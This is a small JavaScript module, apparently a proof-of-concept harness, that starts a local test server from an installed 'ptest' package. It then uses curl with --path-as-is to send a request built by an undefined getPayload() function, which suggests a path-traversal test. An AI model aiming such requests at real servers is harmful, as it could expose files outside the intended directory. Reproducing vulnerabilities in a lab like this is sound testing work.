function exploitFunction() {
  const path = require("path");
  const { exec } = require("child_process");

  // Start the server
  let server = "node ./node_modules/ptest/server.js";
  let exe = exec(server, (error, stdout) => {});

  // Use setTimeout for a delay instead of sleep
  setTimeout(() => {
    // Generate the attack string
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${getPayload()}"`;

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
      if (stdout) {
        return stdout;
      }
      return error;
    });
  }, 2000); // 2 seconds delay

  // Return a promise to handle async nature
  return new Promise((resolve, reject) => {
    exe.on('close', (code) => {
      resolve(code);
    });
  });
}

module.exports = { exploitFunction };